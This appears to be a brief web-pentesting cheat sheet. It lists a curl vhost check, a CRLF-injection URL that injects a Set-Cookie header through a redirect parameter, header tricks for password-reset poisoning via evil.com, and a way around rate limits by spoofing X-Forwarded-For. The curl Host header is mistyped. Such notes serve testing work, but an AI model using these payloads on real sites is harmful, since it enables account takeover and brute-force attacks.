**Check if `vhost` is a live on specific DNS or subdomain:**

```
curl -s -H "Host. $SUBDOMAIN.EXAMPLE.BA" http://example.ba
```

Other techniques described in [vhost enumeration](./vhost-enumeration)

**Redirect URI with a Set-Cookie in GET request:**

```
http://$EXAMPLE.BA/index.php?redirect_url=/%3f%0d%0a%09set-cookie:+hello=yoyoo
```

**Rate Limit Bypass**

```
Headers:
    * X-Forwarded-Host: http://evil.com (Password reset poisoning)
    * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass)
Permutations:
    * Null byte techniques
    * Case sensitiveness
```

Some other techniques can be used, ie. [403 bypass](./bypass-403-nginx) via header manipulation.
